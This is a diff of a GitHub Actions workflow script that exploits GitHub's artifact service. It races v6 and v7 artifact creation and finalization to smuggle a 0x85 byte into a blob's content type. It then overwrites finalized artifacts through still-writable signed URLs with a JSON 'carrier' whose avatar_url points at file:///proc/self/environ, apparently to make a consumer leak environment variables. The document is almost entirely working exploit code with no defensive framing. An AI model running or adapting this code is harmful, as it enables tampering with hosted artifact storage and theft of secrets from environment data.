@@ -31,152 +31,110 @@ jobs:
 
             const SVC = endpoint.replace(/\/+$/, '')
               + '/twirp/github.actions.results.api.v1.ArtifactService/';
-            // One U+0085. node writes header blocks as latin1, so the blob content type
-            // lands as a single 0x85 byte; python .strip() eats it, JS .trim() does not.
+            // One U+0085: node writes header blocks as latin1, so the blob content type
+            // lands as a single 0x85 byte. python .strip() eats it, JS .trim() does not.
             const ODD = '\u0085application/json';
             const IDS = {
               workflow_run_backend_id: runBackendId,
               workflow_job_run_backend_id: jobBackendId,
             };
-            const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+            const repo = process.env.GITHUB_REPOSITORY;
 
             async function rpc(method, body) {
-              try {
-                const r = await fetch(SVC + method, {
-                  method: 'POST',
-                  headers: { Authorization: 'Bearer ' + token, 'Content-Type': 'application/json' },
-                  body: JSON.stringify(body),
-                });
-                const text = await r.text();
-                let json = null;
-                try { json = JSON.parse(text); } catch (e) { /* non-JSON error body */ }
-                return { status: r.status, json, text: text.slice(0, 180) };
-              } catch (e) {
-                return { status: 0, json: null, text: String(e).slice(0, 180) };
-              }
+              const r = await fetch(SVC + method, {
+                method: 'POST',
+                headers: { Authorization: 'Bearer ' + token, 'Content-Type': 'application/json' },
+                body: JSON.stringify(body),
+              });
+              const text = await r.text();
+              if (r.status !== 200) throw new Error(`${method} ${r.status} ${text.slice(0, 140)}`);
+              return JSON.parse(text);
             }
 
-            const create = (name, version, mime) =>
+            const createArtifact = (name, version, mime) =>
               rpc('CreateArtifact', { ...IDS, name, version, mime_type: mime });
-            const finalize = (name, bytes) =>
+            const finalizeArtifact = (name, bytes) =>
               rpc('FinalizeArtifact', { ...IDS, name, size: String(bytes.length),
                 hash: 'sha256:' + crypto.createHash('sha256').update(bytes).digest('hex') });
-            const remove = (name) => rpc('DeleteArtifact', { ...IDS, name });
-            const signedUrl = (name) => rpc('GetSignedArtifactURL', { ...IDS, name });
 
-            function blobPut(url, body, contentType) {
-              return new Promise((resolve) => {
-                if (!url) { resolve('nourl'); return; }
-                const u = new URL(url);
+            function upload(signedUrl, body) {
+              return new Promise((resolve, reject) => {
+                const u = new URL(signedUrl);
                 const req = https.request({
                   method: 'PUT', hostname: u.hostname, path: u.pathname + u.search,
                   headers: {
                     'x-ms-blob-type': 'BlockBlob',
-                    'x-ms-blob-content-type': contentType,
+                    'x-ms-blob-content-type': ODD,
                     'x-ms-version': '2021-08-06',
                     'content-length': Buffer.byteLength(body),
                   },
-                }, (res) => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
-                req.on('error', (e) => resolve('ERR:' + e.message));
+                }, (res) => {
+                  res.resume();
+                  res.on('end', () => res.statusCode < 300
+                    ? resolve(res.statusCode)
+                    : reject(new Error('blob PUT ' + res.statusCode)));
+                });
+                req.on('error', reject);
                 req.end(body);
               });
             }
 
-            const uploadUrl = (r) => r.json && (r.json.signedUploadUrl || r.json.signed_upload_url);
-            const artifactId = (r) => r.json && String(r.json.artifactId || r.json.artifact_id || '');
-            const rsctOf = (r) => {
-              const u = r.json && (r.json.signedUrl || r.json.signed_url);
-              if (!u) return null;
-              try { return new URL(u).searchParams.get('rsct'); } catch (e) { return null; }
-            };
+            const uploadUrlOf = (r) => r.signedUploadUrl || r.signed_upload_url;
+            const idOf = (r) => String(r.artifactId || r.artifact_id || '');
 
-            const probe = Buffer.from('{"probe":"race"}');
-            const repo = process.env.GITHUB_REPOSITORY;
-
-            function carrierFor(id) {
-              const repository = `${repo}/actions/artifacts/${id}/zip`;
-              return {
-                repository,
-                bytes: Buffer.from(JSON.stringify({
-                  full_name: repository,
-                  owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
-                  description: 'repo cassette carrier',
-                  stargazers_count: 0,
-                })),
-              };
+            function carrier(artifactId) {
+              return Buffer.from(JSON.stringify({
+                full_name: `${repo}/actions/artifacts/${artifactId}/zip`,
+                owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
+                description: 'repo cassette carrier',
+                stargazers_count: 0,
+              }));
             }
 
-            const winners = [];
-            async function land(name, urls, id, row) {
-              const { repository, bytes } = carrierFor(id);
-              const puts = [];
-              for (const u of urls) puts.push(await blobPut(u, bytes, ODD));
-              const w = { ...row, id, repository, puts,
-                sha256: crypto.createHash('sha256').update(bytes).digest('hex'),
-                carrier_b64: bytes.toString('base64') };
-              winners.push(w);
-              core.info('WINNER ' + JSON.stringify(w));
-            }
+            // A shared-name v6/v7 creation race: v6 stores mime_type without validating
+            // it, v7 is the version whose delivery honours mime_type. Racing both creates
+            // (and both finalizes) on one name can leave the v6 metadata on the v7
+            // delivery path, which is the only way to get a 0x85 into the Content-Type.
+            async function race(index) {
+              const name = `carrier-${index}-${Date.now()}`;
+              const specs = index % 2
+                ? [[7, 'application/json'], [6, ODD]]
+                : [[6, ODD], [7, 'application/json']];
+              const created = await Promise.all(
+                specs.map(([version, mime]) => createArtifact(name, version, mime)));
+              const placeholder = Buffer.from('{"probe":"placeholder"}');
+              await Promise.all(created.map(c => upload(uploadUrlOf(c), placeholder)));
 
-            // delete-then-recreate across v6 (mime_type stored unvalidated) and v7
-            // (mime_type honoured but validated), so the record can end up honouring
-            // a mime_type that v7 would never have accepted.
-            async function trial(kind, index, firstVersion, delay) {
-              const name = `race-${process.env.GITHUB_RUN_ID}-${kind}-${firstVersion}-${delay}-${index}`;
-              const other = firstVersion === 7 ? 6 : 7;
-              const first = await create(name, firstVersion, firstVersion === 7 ? 'application/json' : ODD);
-              const url1 = uploadUrl(first);
-              const put1 = await blobPut(url1, probe, ODD);
-              let firstFinal = { status: 0 };
-              if (kind === 'finalized') firstFinal = await finalize(name, probe);
+              const settled = await Promise.allSettled([
+                finalizeArtifact(name, placeholder),
+                finalizeArtifact(name, placeholder),
+              ]);
+              const ids = [...new Set(settled
+                .filter(s => s.status === 'fulfilled')
+                .map(s => idOf(s.value))
+                .filter(Boolean))];
+              if (!ids.length) throw new Error('both finalizes failed');
 
-              let delPromise, createPromise;
-              if (delay < 0) {
-                delPromise = remove(name);
-                await sleep(-delay);
-                createPromise = create(name, other, other === 7 ? 'application/json' : ODD);
-              } else {
-                createPromise = create(name, other, other === 7 ? 'application/json' : ODD);
-                await sleep(delay);
-                delPromise = remove(name);
+              // The signed upload URLs stay writable after finalization, which is how the
+              // body can reference its own artifact id.
+              for (const id of ids) {
+                const bytes = carrier(id);
+                await Promise.all(created.map(c => upload(uploadUrlOf(c), bytes)));
               }
-              const [removed, second] = await Promise.all([delPromise, createPromise]);
-              const url2 = uploadUrl(second);
-              const put2 = await blobPut(url2, probe, ODD);
-              const final = await finalize(name, probe);
-              const view = await signedUrl(name);
-              const rsct = rsctOf(view);
-              const row = { kind, index, firstVersion, delay,
-                c1: first.status, put1, f1: firstFinal.status, del: removed.status,
-                c2: second.status, put2, f2: final.status, rsct,
-                rsct_hex: rsct === null ? null : Buffer.from(rsct, 'utf8').toString('hex'),
-                err: [first, second, final, view].map(r => r.status === 200 ? '' : r.text).filter(Boolean)[0] || '' };
-              const id = artifactId(final) || artifactId(firstFinal);
-              if (rsct !== null && rsct.includes('\u0085') && id) {
-                await land(name, [url1, url2].filter(Boolean), id, row);
-              }
-              return row;
+              const id = ids.at(-1);
+              const bytes = carrier(id);
+              return { name, id, ids, repository: `${repo}/actions/artifacts/${id}/zip`,
+                sha256: crypto.createHash('sha256').update(bytes).digest('hex') };
             }
 
-            const plan = [];
-            for (let i = 0; i < 6; i++) {
-              for (const fv of [6, 7]) {
-                plan.push(['pending', i, fv, 0]);
-                for (const d of [-20, 0, 20]) plan.push(['finalized', i, fv, d]);
+            const built = [];
+            for (let index = 0; index < 64; index += 1) {
+              try {
+                const result = await race(index);
+                built.push(result);
+                core.info(`BUILT ${JSON.stringify(result)}`);
+              } catch (error) {
+                core.info(`SKIPPED ${index}: ${String(error.message).slice(0, 160)}`);
               }
             }
-            const rows = [];
-            for (let i = 0; i < plan.length; i += 8) {
-              const batch = plan.slice(i, i + 8);
-              rows.push(...await Promise.all(batch.map(a => trial(a[0], a[1], a[2], a[3]))));
-            }
-
-            const tally = {};
-            for (const r of rows) {
-              const k = r.rsct === null ? 'null' : (r.rsct.includes('\u0085') ? 'ODD' : r.rsct);
-              tally[k] = (tally[k] || 0) + 1;
-            }
-            core.info('TALLY ' + JSON.stringify(tally));
-            core.info('SAMPLE ' + JSON.stringify(rows.slice(0, 6)));
-            core.info('WINNERS ' + JSON.stringify(winners.map(w => [w.id, w.repository, w.sha256])));
-            if (winners.length) core.info('CARRIER_B64 ' + winners[0].carrier_b64);
+            core.info(`MANIFEST ${JSON.stringify(built)}`);
